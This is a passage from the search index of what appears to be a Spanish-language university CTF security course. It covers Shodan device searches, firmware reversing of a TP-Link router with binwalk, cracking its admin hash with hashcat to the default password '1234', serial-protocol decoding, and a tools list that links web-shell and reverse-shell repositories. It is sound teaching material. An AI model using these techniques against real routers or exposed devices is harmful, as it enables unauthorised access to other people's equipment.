id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eEn Shodan podemos buscar por casi cualquier tipo de dispositivo. En este ejemplo buscaremos termostatos\nconectados a internet. Para eso ingresamos al sitio y buscamos la palabra \u003ccode\u003ethermostat\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../shodan-thermostat.png\" alt=\"Shodan Thermostat Search\"\u003e\u003c/p\u003e\n\u003cp\u003eHaciendo click en uno de los resultados cualquiera podemos ver la región a la cual pertenece, los puertos que\ntiene abiertos y el servicio que ofrece en cada puerto.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../shodan-result-details.png\" alt=\"Shodan Result Details\"\u003e\u003c/p\u003e\n"},{id:47,href:"/docs/osint/ejercicios/",title:"Ejercicios OSINT",description:null,content:"\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eRevisar si alguna cuenta asociada a sus correos o los de amigos y familiares (con permiso de cada persona)\nha sido comprometida por medio de contraseñas filtradas.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver el challenge de OSINT \u003ca href=\"https://app.hackthebox.eu/challenges/ID-Exposed\"\u003eID Exposed\u003c/a\u003e en HTB.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n"},{id:48,href:"/docs/hardware/intro/",title:"Intro a Hardware",description:null,content:"\u003cp\u003eHoy en día estamos rodeados de dispositivos con la capacidad de recibir y transmitir\ninformación. Desde electrónicos simples, como sensores de luz, hasta dispositivos\naltamente integrados y complejos, como teléfonos celulares. Cada uno de estos requiere\nde un programa o software que le otorgue su funcionamiento básico, además de instrucciones sobre\ncómo leer y enviar información. En este capítulo veremos problemas de Hardware,\nque tratan de aprovecharse de ciertas fallas o ausencia de mecanismos de seguridad\nen los dispositivos.\u003c/p\u003e\n\u003cp\u003eSi bien los problemas de Hardware están basados en Hardware Hacking\n(y muchas de las herramientas y técnicas utilizadas para estos problemas también sirven para eso),\nno es necesario tener hardware ni hackear hardware físicamente para resolverlos.\nEstos usualmente se basan en analizar el firmware de algún dispositivo, como un IoT,\no decodificar información enviada a través de un canal de transmisión interceptado,\ncomo los cables entre un controlador y una pantalla LCD.\u003c/p\u003e\n\u003cp\u003eAl igual que todos los temas que hemos visto en este ramo, los problemas de Hardware\npueden ser muy amplios y abarcar múltilpes técnicas, requiriendo conocimientos\nde muchas áreas. Nosotros nos centraremos en 2 cosas:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eReversing de \u003cem\u003efirmware\u003c/em\u003e: Analizar el código básico que corre un dispositivo\npara encontrar fallas de seguridad en este.\u003c/li\u003e\n\u003cli\u003eDecodificar los protocolos de comunicación serial: Leer la información\nenviada entre dispositivos a través de cables o bus de comunicación.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eEn la práctica, estas dos técnicas suelen utilizarse en conjunto; se conecta directamente\na la interfaz serial (por ejemplo UART) del dispositivo que se quiere hackear,\ncon lo cual se fuerza un dump del \u003cem\u003efirmware\u003c/em\u003e. Luego, se analiza este \u003cem\u003efirmware\u003c/em\u003e\npara encontrar vulnerabilidades y luego explotarlas en el dispositivo mismo.\u003c/p\u003e\n\u003cp\u003ePor restricciones de tiempo, hay muchas cosas que no veremos en este ramo. Por ejemplo\ndecodificar ondas de radio, leer el protocolo USB, explotar PLCs, entre muchos otros.\u003c/p\u003e\n"},{id:49,href:"/docs/hardware/firmware/",title:"Reversing de Firmware",description:null,content:"\u003cp\u003eEl \u003cem\u003efirmware\u003c/em\u003e es el código básico que le permite al dispositivo saber cómo funcionar.\nLe indica cómo encenderse, iniciar servicios, utilizar los sensores, comunicarse\ny sus configuraciones principales. El \u003cem\u003efirmware\u003c/em\u003e puede tomar muchas formas diferentes;\npuede ser código binario, ejecutables, o incluso un sistema operativo completo.\u003c/p\u003e\n\u003cp\u003eEste último es el caso para muchos dispotiviso IoT, como cámaras de seguridad,\nimpresoras, routers, y sensores de todo tipo. Como caso de estudio veremos el siguiente dispositivo:\n\u003ca href=\"https://www.tp-link.com/us/home-networking/wifi-router/tl-wr841n/\"\u003eTP-Link Wireless N Router TL-WR841N V14.80\u003c/a\u003e.\nPueden descargar el firmware desde su \u003ca href=\"https://www.tp-link.com/us/support/download/tl-wr841n/#Firmware\"\u003epágina oficial\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003ePara este caso usaremos la versión 14.8_220816, publicada en la fecha 2022-11-23.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../tp-link-firmware.png\" alt=\"Firmware\"\u003e\u003c/p\u003e\n\u003cp\u003eAl descargarlo vemos que es un archivo \u003ccode\u003e.zip\u003c/code\u003e con dos documentos PDF y un \u003ccode\u003e.bin\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../zip-contents.png\" alt=\"Contenidos ZIP\"\u003e\u003c/p\u003e\n\u003cp\u003eAnalizamos el contenido del binario usando \u003ccode\u003ebinwalk\u003c/code\u003e y encontramos múltiples secciones\ninteresantes.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eU-Boot\u003c/strong\u003e: Es un \u003cem\u003eboot loader\u003c/em\u003e que empaqueta las instrucciones para iniciar el\nkernel del sistema operativo.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLZMA\u003c/strong\u003e: Es un algoritmo de compresión. Contiene algunos datos utilizados por el dispositivo.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSquashFS\u003c/strong\u003e: Es el sistema de archivos de un sistema operativo, comprimidos en un solo archivo.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../binwalk.png\" alt=\"Binwalk\"\u003e\u003c/p\u003e\n\u003cp\u003eAfortunadamente, \u003ccode\u003ebinwalk\u003c/code\u003e es capaz de extraer estas secciones automáticamente:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ebinwalk -e TL-WR841Nv14_US_0.9.1_4.19_up_boot\\[220816-rel43928\\].bin\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eObtenemos algunos documentos y directorios.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../contents-squashfs.png\" alt=\"Contenido Squashfs\"\u003e\u003c/p\u003e\n\u003cp\u003eY en particular, el directorio \u003ccode\u003esquashfs-root\u003c/code\u003e es la raíz de un sistema de archivos Linux.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../linux-fs.png\" alt=\"Sistema de archivos Linux\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, encontramos el hash de la contraseña por defecto para el usuario admin contenida\nen el archivo \u003ccode\u003esquashfs-root/etc/passwd.bak\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../password.png\" alt=\"Password\"\u003e\u003c/p\u003e\n\u003cp\u003eAlmacenamos el hash en el archivo \u003ccode\u003ehash.txt\u003c/code\u003e y lo rompemos usando \u003ccode\u003ehashcat\u003c/code\u003e.\nLa contraseña resulta ser \u003ccode\u003e1234\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"../hashcat.png\" alt=\"Hashcat\"\u003e\u003c/p\u003e\n\u003cp\u003eDe esta forma se puede analizar diferentes componentes del firmware, para encontrar\nsecretos, configuraciones y funcionalidades del dispositivo. Dado que la gran mayoría\nde los usuarios no cambia las configuraciones por defecto, es muy probable que\ncualquier falla de seguridad encontrada al analizar el firmware, también se encuentre\nen los dispositivos en uso. Adicionalmente, si existe una vulnerabilidad inherente\nal \u003cem\u003efirmware\u003c/em\u003e (por ejemplo un \u003cem\u003ebuffer overflow\u003c/em\u003e), esta será explotable en todos los\ndispositivos corriendo con dicho \u003cem\u003efirmware\u003c/em\u003e.\u003c/p\u003e\n"},{id:50,href:"/docs/hardware/communication/",title:"Protocolos de Comunicación",description:null,content:"\u003ch2 id=\"protocolos\"\u003eProtocolos\u003c/h2\u003e\n\u003cp\u003eA continuación veremos cómo funcionan ciertos protocolos de comunicación serial.\nEstos se utilizan para comunicar dispositivos directamente, mediante un bus de datos.\nEl bus de datos suele tomar la forma de cables conectando directamente a los dispositivos,\ny cumlpen ciertas condiciones para lograr establecer la comunicación.\u003c/p\u003e\n\u003ch3 id=\"uart\"\u003eUART\u003c/h3\u003e\n\u003cp\u003eUno de los protocolos de comunicación de bajo nivel más utilizados y antiguos es\nel \u003cem\u003eUniversal Asynchronous Receiver - Transmitter\u003c/em\u003e (\u003cstrong\u003eUART\u003c/strong\u003e).\nEs un tipo de comunicación serial y bidireccional (\u003cem\u003efull-duplex\u003c/em\u003e) entre 2 dispositivos,\nutilizando únicamente 2 cables: \u003cem\u003eTransmitter\u003c/em\u003e (Tx) y \u003cem\u003eReceiver\u003c/em\u003e (Rx).\nNotar que el Tx de un dispositivo es el Rx del otro, y viceversa.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../uart.png\" alt=\"UART\"\u003e\u003c/p\u003e\n\u003cp\u003eLa frecuencia de transmisión, llamada \u003cem\u003eBaud rate\u003c/em\u003e y medida en \u003cem\u003ebits-per-second\u003c/em\u003e (bps),\ndebe acordarse previamente entre los dispositivos.\nEn teoría no hay restricciones (aparte de físicas) en la frecuencia que pueden tomar,\npero en la práctica hay tan solo unas pocas frecuencias que se utilizan:\n1200, 2400, 4800, 9600, 19200, 38400, 57600, y 115200 bps. Dentro de estas,\n9600 bps es la más común.\u003c/p\u003e\n\u003cp\u003eLos datos se envían en \u003cem\u003eframes\u003c/em\u003e de entre 5 y 9 bits. Cada \u003cem\u003eframe\u003c/em\u003e lleva adicionalmente\nbits de inicio y término, y opcionalmente un bit de paridad. El flujo completo es el siguiente:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBit de inicio (\u003cem\u003estart bit\u003c/em\u003e): Indica el inicio de una transmisión.\u003c/li\u003e\n\u003cli\u003eBits de datos (\u003cem\u003edata bits\u003c/em\u003e): Entre 5 y 9 bits con los datos transmitidos.\u003c/li\u003e\n\u003cli\u003eBit de paridad (\u003cem\u003eparity bit\u003c/em\u003e, opcional): Indica la paridad de los bits de datos.\nSe utiliza para detectar cambios en la transmisión.\u003c/li\u003e\n\u003cli\u003eBit de término (\u003cem\u003estop bit\u003c/em\u003e): Indica el fin de una transmisión.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSe envía tantos \u003cem\u003eframes\u003c/em\u003e como sea necesario para transmitir toda la información.\nCada \u003cem\u003eframe\u003c/em\u003e enviado puede representar un caracter, un número, o incluso\ndatos binarios. La siguiente imagen, obtenida de\n\u003ca href=\"https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter\"\u003eWikipedia\u003c/a\u003e,\nexplica bastante bien el proceso. Notar que el BCLK es la frecuencia de transmisión\nacordada previamente entre los dispositivos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../uart-signal.png\" alt=\"UART Signal\"\u003e\u003c/p\u003e\n\u003ch3 id=\"i2c\"\u003eI2C\u003c/h3\u003e\n\u003cp\u003e\u003cem\u003eInter-Integrated Circuit\u003c/em\u003e (\u003cstrong\u003eI2C\u003c/strong\u003e) también utiliza 2 cables, pero este protocolo\nes solo \u003cem\u003ehalf-duplex\u003c/em\u003e. Es decir que los dispositivos deben tomar turnos para transmitir.\nAdicionalmente, se permiten más de dos dispositivos conectados, con uno funcionando\ncomo transmisor y el resto como receptores.\u003c/p\u003e\n\u003cp\u003ePara la comunicación, la información es enviada a través de la línea de datos SDA,\nmientras que el reloj que coordina a los dispositivos se transmite en la línea SCL.\nLuego, y a diferencia de UART, no se necesita información adicional para establecer\nla comunicación.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../i2c.png\" alt=\"I2C\"\u003e\u003c/p\u003e\n\u003cp\u003eDado que I2C utiliza solo un canal para la comunicación entre múltiples dispositivos,\nel protocolo es un poco más complejo que UART. Requiere de secuencias de sincronización\npara determinar quién puede transmitir en cada momento, bytes de ACK y NACK,\npara indicar si se recibió correctamente cada parte del mensaje, direcciones de destino,\npara saber a cuál de los dispositivos se está transmitiendo, entre otras cosas.\nNo entraremos en más detalle para este protocolo, dado que puede variar significativamente\nentre implementaciones.\u003c/p\u003e\n\u003ch3 id=\"spi\"\u003eSPI\u003c/h3\u003e\n\u003cp\u003ePor último, tenemos el \u003cem\u003eSerial Peripheral Interface\u003c/em\u003e (\u003cstrong\u003eSPI\u003c/strong\u003e), también llamado\n\u003cem\u003efour-wire serial bus\u003c/em\u003e (bus de comunicación de cuatro cables), el cual fue diseñado\npara comunicación a distancias cortas. Este permite una transferencia de datos\nmucho más alta que los protocolos anteriores, de aproximadamente 250 Mbps.\nLa comunicación es de tipo síncrona, \u003cem\u003efull-duplex\u003c/em\u003e y permite a más de dos dispositivos\nconectados, pero por simplicidad, solo veremos el caso de un \u003cem\u003emaster\u003c/em\u003e y un \u003cem\u003eslave\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eEl protocolo requiere de cuatro señales para establecer comunicación:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSCLK\u003c/strong\u003e: \u003cem\u003eSerial Clock\u003c/em\u003e, señal de reloj utilizada para sincronizar los dispositivos.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMOSI\u003c/strong\u003e: \u003cem\u003eMaster Out Slave In\u003c/em\u003e, los datos enviados desde el controlador (\u003cem\u003emaster\u003c/em\u003e),\nhacia el dispositivo periférico (\u003cem\u003eslave\u003c/em\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMISO\u003c/strong\u003e: \u003cem\u003eMaster In Slave Out\u003c/em\u003e, los datos enviados desde el dispositivo periférico\nhacia el controlador.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSS\u003c/strong\u003e: \u003cem\u003eSlave Select\u003c/em\u003e, funciona como una señal de \u003cem\u003eenable\u003c/em\u003e. Le indica al\ndispositivo periférico que el controlador está enviando datos.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../spi.png\" alt=\"SPI\"\u003e\u003c/p\u003e\n\u003cp\u003eLa transmisión de datos suele consistir en palabras (\u003cem\u003ewords\u003c/em\u003e) de 8 bits,\naunque algunos dispositivos soportan hasta 12 o 16 bits. A diferencia de UART,\nSPI no requiere de bits de inicio ni término de la transmisión, lo que le permite\nuna mayor densidad de datos transmitidos. Tampoco interrumpe la transmisión para\nverificar la recepción ni para coordinar a los dispositivos. Esto último puede\nsignificar que el controlador transmita al vacío sin saberlo.\u003c/p\u003e\n\u003cp\u003eDebido a la alta flexibilidad de SPI, no existe una única forma de transmitir\nla información. Esto es altamente dependiente de la implementación en particular,\ny los datos pueden ir codificados de diferentes formas. Debido a esto, no entraremos\nen más detalle sobre el protocolo.\u003c/p\u003e\n\u003ch2 id=\"herramientas\"\u003eHerramientas\u003c/h2\u003e\n\u003cp\u003ePara efectos de este ramo, utilizaremos las herramientas desarrolladas por\n\u003ca href=\"https://www.saleae.com/\"\u003eSaleae\u003c/a\u003e para decodificar y leer señales UART, I2C y SPI.\nExisten otras herramientas con diferentes funcionalidades, capacidades y propósitos,\npero no serán necesarias para este curso. Estas herramientas permiten decodificar\ndirectamente la información enviada por medio de los protocolos mencionados\nanteriormente, extrayendo automáticamente el mensaje.\u003c/p\u003e\n\u003ch3 id=\"logic-1\"\u003eLogic 1\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://support.saleae.com/logic-software/legacy-software/older-software-releases\"\u003eLogic 1\u003c/a\u003e\nes una herramienta de legado, la cual ya no se actualiza.\nSin embargo, sirve para leer y visualizar archivos \u003ccode\u003e.logicdata\u003c/code\u003e.\nLas funcionalidades de esta versión son relativamente limitadas, pero permite trabajar con\ndiferentes tipos de señales.\u003c/p\u003e\n\u003cp\u003eComo ejemplo, decodificaremos una señal I2C usando Logic 1. Primero abrimos el\narchivo \u003ccode\u003e.logicdata\u003c/code\u003e usando Logic 1.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic1-i2c1.png\" alt=\"Logic 1 I2C 1\"\u003e\u003c/p\u003e\n\u003cp\u003eSeleccionamos el \u003cem\u003eanalyzer\u003c/em\u003e de I2C.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic1-i2c2.png\" alt=\"Logic 1 I2C 2\"\u003e\u003c/p\u003e\n\u003cp\u003eLo configuramos de la siguiente manera. Sabemos previamente que las direcciones son\nsolo de 7 bits, por lo que usamos esa configuración.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic1-i2c3.png\" alt=\"Logic 1 I2C 3\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, exportamos el resultado. En este caso no tienen mucho sentido los datos,\ndado que deben ser procesados luego de la exportación.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic1-i2c4.png\" alt=\"Logic 1 I2C 4\"\u003e\u003c/p\u003e\n\u003ch3 id=\"logic-2\"\u003eLogic 2\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://www.saleae.com/downloads/\"\u003eLogic 2\u003c/a\u003e es la versión soportada del software,\ny lee archivos \u003ccode\u003e.sal\u003c/code\u003e.\nLos desarrolladores de Saleae no disponen de una herramienta para exportar\nni convertir formatos entre las versiones de su software.\nEsta versión cuenta con muchas más funcionalidades que Logic 1;\npermite instalar extensiones, realizar análisis más complejos,\nvisualizar los datos de una mejor manera, entre otras cosas.\u003c/p\u003e\n\u003cp\u003eA continuación analizaremos el contenido de una transmisión UART. En este caso\nsolo tenemos los datos enviados a través de un cable y no conocemos el \u003cem\u003ebaud rate\u003c/em\u003e.\nPrimero abrimos Logic 2 e importamos el archivo \u003ccode\u003e.sal\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart1.png\" alt=\"Logic 2 UART 1\"\u003e\u003c/p\u003e\n\u003cp\u003eDe ser necesario, instalamos las extensiones \u003cem\u003eBaud rate estimate\u003c/em\u003e y \u003cem\u003eUART HIC Decoder\u003c/em\u003e\nde la pestaña de extensiones.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart2.png\" alt=\"Logic 2 UART 2\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego, vamos a la pestaña de mediciones y medimos la señal completa, para encontrar\nque el \u003cem\u003ebaud rate\u003c/em\u003e estimado es de 31.23 kHz.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart3.png\" alt=\"Logic 2 UART 3\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, vamos a la pestaña de \u003cem\u003eanalyzers\u003c/em\u003e, y seleccionamos un \u003cem\u003easync serial\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart4.png\" alt=\"Logic 2 UART 4\"\u003e\u003c/p\u003e\n\u003cp\u003eLo configuramos con la frecuencia que encontramos y usamos los valores estándar\npara el resto de los parámetros.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart5.png\" alt=\"Logic 2 UART 5\"\u003e\u003c/p\u003e\n\u003cp\u003eCon esto logramos decodificar la señal y obtener su contenido. Los datos pueden\nser exportados a un archivo CSV o copiados directamente del programa.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../logic2-uart6.png\" alt=\"Logic 2 UART 6\"\u003e\u003c/p\u003e\n"},{id:51,href:"/docs/hardware/ejercicios/",title:"Ejercicios de Hardware",description:null,content:"\u003ch2 id=\"hackthebox\"\u003eHackTheBox\u003c/h2\u003e\n\u003ch3 id=\"firmware\"\u003eFirmware\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/the-needle\"\u003e\u003cstrong\u003eThe Needle\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/bare-metal\"\u003e\u003cstrong\u003eBare Metal\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"comunicación-serial\"\u003eComunicación serial\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/debugging-interface\"\u003e\u003cstrong\u003eDebugging Interface\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.com/challenges/mission-pinpossible\"\u003e\u003cstrong\u003eMission Pinpossible\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:52,href:"/docs/anexos/",title:"Anexos",description:null,content:""},{id:53,href:"/docs/anexos/herramientas/",title:"Herramientas",description:null,content:"\u003cp\u003eA continuación se agrupan enlaces a herramientas útiles para cada una de las siguientes categorías de problemas. Estas herramientas son mencionadas en cada capítulo de forma desordenada, por lo que esta sección sirve para encontrarlas directamente.\u003c/p\u003e\n\u003ch2 id=\"esteganografía\"\u003eEsteganografía\u003c/h2\u003e\n\u003ch2 id=\"criptografía-moderna\"\u003eCriptografía Moderna\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Ganapati/RsaCtfTool\"\u003eRsaCtfTool\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.alpertron.com.ar/ECM.HTM\"\u003eFactorización prima\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://lapo.it/asn1js/\"\u003eASN.1 Decoder\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"aplicaciones-web\"\u003eAplicaciones Web\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\"\u003eFoxyProxy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003eBurp Suite Community Edition\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/maurosoria/dirsearch\"\u003eDirsearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/xmendez/wfuzz\"\u003eWfuzz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vanhauser-thc/thc-hydra\"\u003eHydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sqlmapproject/sqlmap\"\u003eSqlmap\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/tennc/webshell\"\u003eRepo de Web Shells\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\"\u003eRepo de Reverse Shells\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/calebstewart/pwncat\"\u003ePwncat\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/searchsploit\"\u003eSearchsploit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"análisis-forense\"\u003eAnálisis Forense\u003c/h2\u003e\n\u003ch2 id=\"ingeniería-reversa\"\u003eIngeniería Reversa\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eDecompilación\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://rada.re/n/radare2.html\"\u003eRadare2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ghidra-sre.org/\"\u003eGhidra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://java-decompiler.github.io/\"\u003eJD-GUI\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://pypi.org/project/uncompyle6/\"\u003euncompyle6\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rocky/python-decompile3\"\u003edecompyle3\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eDeobfuscación\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eJavaScript\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://lelinhtinh.github.io/de4js/\"\u003ede4js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://jsnice.org/\"\u003eJS Nice\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr/javascript-unobfuscator\"\u003edCode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://codeamaze.com/code-beautifier/javascript-deobfuscator\"\u003eCode Amaze\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://deobfuscatejavascript.com/\"\u003eDeobfuscate JavaScript\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePython\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/extremecoders-re/bytecode_simplifier\"\u003eBytecode Simplifier\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://pypi.org/project/deopy/\"\u003edeopy\u003c/a\u003e (Python3.6+)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePHP\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.unphp.net/\"\u003eUnPHP\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/simon816/PHPDeobfuscator\"\u003ePHPDeobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Antelox/FOPO-PHP-Deobfuscator\"\u003eFOPO PHP Deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://jonhburn2.freehostia.com/decode/\"\u003ePHP Deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eJava\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/java-deobfuscator/deobfuscator\"\u003eDeobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jdec.app/\"\u003ejdec\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/D3Hunter/deobfuscator\"\u003eAll-in-one deobfuscator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e.NET\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/de4dot/de4dot\"\u003ede4dot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/NotPrab/.NET-Deobfuscator\"\u003eLista de deobfuscadores opensource\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pwning\"\u003ePwning\u003c/h2\u003e\n\u003ch2 id=\"osint\"\u003eOSINT\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/laramies/theHarvester\"\u003etheHarvester\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.shodan.io/\"\u003eShodan\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"hardware\"\u003eHardware\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://support.saleae.com/logic-software/legacy-software/older-software-releases\"\u003eLogic 1\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.saleae.com/downloads/\"\u003eLogic 2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:54,href:"/docs/anexos/vpn/",title:"Configuración de VPN",description:null,content:"\u003cp\u003ePara poder tener acceso a la máquina que se usará en los CTF y tareas, necesitan conectarse por VPN a la red de la Universidad. A continuación se enumeran los pasos necesarios para hacer esto.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInicien sesión en la máquina Kali que se usará en el curso\u003c/li\u003e\n\u003cli\u003eDescargar perfil OpenVPN del CEC desde \u003ca href=\"https://www.cec.uchile.cl/download/OPENVPN/CEC-fcfm.ovpn\"\u003eacá\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eAbrir un terminal en la carpeta en que descargaron el archivo y ejecutar \u003ccode\u003esudo openvpn CEC-fcfm.ovpn\u003c/code\u003e. Colocar como datos de inicio de sesión los datos de la cuenta del CEC (sin incluir @ing.uchile.cl).\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:55,href:"/docs/anexos/kali/",title:"Kali Linux",description:null,content:"\u003cp\u003ePara facilitar tanto al equipo docente como a los estudiantes la solución de problemas 